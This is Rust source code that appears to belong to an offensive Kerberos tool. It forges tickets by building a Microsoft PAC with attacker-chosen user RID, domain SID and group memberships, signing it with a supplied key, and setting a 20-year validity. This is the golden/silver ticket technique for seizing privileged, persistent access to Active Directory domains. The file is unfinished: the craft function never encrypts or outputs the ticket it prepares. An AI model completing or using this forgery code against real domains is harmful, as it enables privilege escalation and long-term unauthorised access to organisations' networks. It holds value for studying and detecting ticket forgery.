use crate::core::{new_nt_principal, Cipher};
use crate::KerberosUser;
use crate::Result;
use chrono::{Duration, Utc};
use kerberos_asn1::{
    AuthorizationData, EncTicketPart, EncryptionKey, PrincipalName, Ticket,
    TransitedEncoding,
};
use kerberos_constants::etypes;
use kerberos_constants::ticket_flags;
use kerberos_constants::key_usages;
use kerberos_constants::ad_types;
use kerberos_crypto::Key;
use ms_dtyp::RID_DOMAIN_USERS;
use ms_pac::{
    GROUP_MEMBERSHIP, KERB_VALIDATION_INFO, NOT_EXPIRE_TIME, NOT_SET_TIME,
    PACTYPE, PAC_CLIENT_INFO, PAC_INFO_BUFFER, PAC_SIGNATURE_DATA, PISID,
};
use ms_samr::{
    SE_GROUP_ENABLED, SE_GROUP_ENABLED_BY_DEFAULT, SE_GROUP_MANDATORY,
    USER_DONT_EXPIRE_PASSWORD, USER_NORMAL_ACCOUNT,
};

pub fn craft(
    user: KerberosUser,
    service: Option<String>,
    user_key: Key,
    user_rid: u32,
    domain_sid: PISID,
    groups: &[u32],
    etype: Option<i32>,
) -> Result<()> {
    let cipher = Cipher::generate(&user_key, &user, etype);

    let pactype = new_pactype(
        &user.name,
        user_rid,
        &user.realm,
        domain_sid,
        groups,
        cipher.etype(),
    );

    let raw_pactype = pactype.build();

    let server_sign = cipher.checksum(key_usages::KEY_USAGE_KERB_NON_KERB_CKSUM_SALT, &raw_pactype);
    let privsrv_sign = cipher.checksum(key_usages::KEY_USAGE_KERB_NON_KERB_CKSUM_SALT, &server_sign);

    let server_checksum = pactype.server_checksum_mut().unwrap();
    server_checksum.Signature = server_sign;

    let privsrv_checksum = pactype.privsrv_checksum_mut().unwrap();
    privsrv_checksum.Signature = privsrv_sign;

    let raw_signed_pactype = pactype.build();

    let mut ticket_builder = EncTicketPartBuilder::new(&user.name, user.realm)
        .random_key(cipher.etype())
        .pac(raw_signed_pactype);

    if service.is_some() {
        ticket_builder = ticket_builder.add_flag(ticket_flags::INITIAL);
    }

    return Ok(());
}

fn new_pactype(
    username: &str,
    user_rid: u32,
    domain: &str,
    domain_sid: PISID,
    groups: &[u32],
    etype: i32,
) -> PACTYPE {
    return PACTYPE::from(vec![
        PAC_INFO_BUFFER::LOGON_INFO(new_kerb_validation_info(
            username, user_rid, domain, domain_sid, groups,
        )),
        PAC_INFO_BUFFER::CLIENT_INFO(new_client_info(username)),
        PAC_INFO_BUFFER::SERVER_CHECKSUM(new_pac_signature(etype)),
        PAC_INFO_BUFFER::PRIVSRV_CHECKSUM(new_pac_signature(etype)),
    ]);
}

fn new_pac_signature(etype: i32) -> PAC_SIGNATURE_DATA {
    return PAC_SIGNATURE_DATA::new_empty(etype);
}

fn new_client_info(username: &str) -> PAC_CLIENT_INFO {
    let now = Utc::now().timestamp() as u64;
    return PAC_CLIENT_INFO::new(now.into(), username);
}

fn new_kerb_validation_info(
    username: &str,
    user_rid: u32,
    domain: &str,
    domain_sid: PISID,
    groups: &[u32],
) -> KERB_VALIDATION_INFO {
    let mut kvi = KERB_VALIDATION_INFO::default();
    let now = Utc::now().timestamp() as u64;

    kvi.LogonTime = now.into();
    kvi.LogoffTime = NOT_EXPIRE_TIME.into();
    kvi.KickOffTime = NOT_EXPIRE_TIME.into();
    kvi.PasswordLastSet = now.into();
    kvi.PasswordCanChange = NOT_SET_TIME.into();
    kvi.PasswordMustChange = NOT_EXPIRE_TIME.into();
    kvi.EfectiveName = username.into();
    kvi.LogonCount = 100;
    kvi.BadPasswordCount = 0;
    kvi.UserId = user_rid;
    kvi.PrimaryGroupId = RID_DOMAIN_USERS;

    for group_id in groups.iter() {
        kvi.GroupIds.push(GROUP_MEMBERSHIP::new(
            *group_id,
            SE_GROUP_MANDATORY | SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT,
        ));
    }

    kvi.LogonDomainName = domain.to_uppercase().as_str().into();
    kvi.LogonDomainId = domain_sid;
    kvi.UserAccountControl = USER_NORMAL_ACCOUNT | USER_DONT_EXPIRE_PASSWORD;

    return kvi;
}

pub struct EncTicketPartBuilder {
    ticket_flags: u32,
    key: EncryptionKey,
    crealm: String,
    cname: PrincipalName,
    authorization_data: Option<AuthorizationData>,
}

impl EncTicketPartBuilder {
    pub fn new(username: &str, realm: String) -> Self {
        let now = Utc::now().timestamp() as u64;
        return Self {
            ticket_flags: ticket_flags::FORWARDABLE
                | ticket_flags::PROXIABLE
                | ticket_flags::RENEWABLE,
            key: random_key(etypes::AES256_CTS_HMAC_SHA1_96),
            crealm: realm,
            cname: new_nt_principal(username),
            authorization_data: None,
        };
    }

    pub fn add_flag(mut self, flag: u32) -> Self {
        self.ticket_flags |= flag;
        self
    }

    pub fn random_key(mut self, etype: i32) -> Self {
        self.key = random_key(etype);
        self
    }

    pub fn pac(mut self, pac: Vec<u8>) -> Self {
        self.authorization_data = Some(AuthorizationData {
            ad_type: ad_types::AD_WIN2K_PACK,
            ad_data: pac
        });
        self
    }

    pub fn build(self) -> EncTicketPart {
        let now = Utc::now();
        let expiration_time =
            now.checked_add_signed(Duration::weeks(20 * 52)).unwrap();
        return EncTicketPart {
            flags: self.ticket_flags.into(),
            key: self.key,
            crealm: self.crealm,
            cname: self.cname,
            transited: TransitedEncoding::default(),
            authtime: now.into(),
            starttime: Some(now.into()),
            endtime: expiration_time.into(),
            renew_till: Some(expiration_time.into()),
            caddr: None,
            authorization_data: self.authorization_data,
        };
    }
}

fn random_key(etype: i32) -> EncryptionKey {
    return EncryptionKey {
        keytype: etype,
        keyvalue: Key::random(etype)
            .expect(&format!("Unsupported etype {}", etype))
            .as_bytes()
            .to_vec(),
    };
}
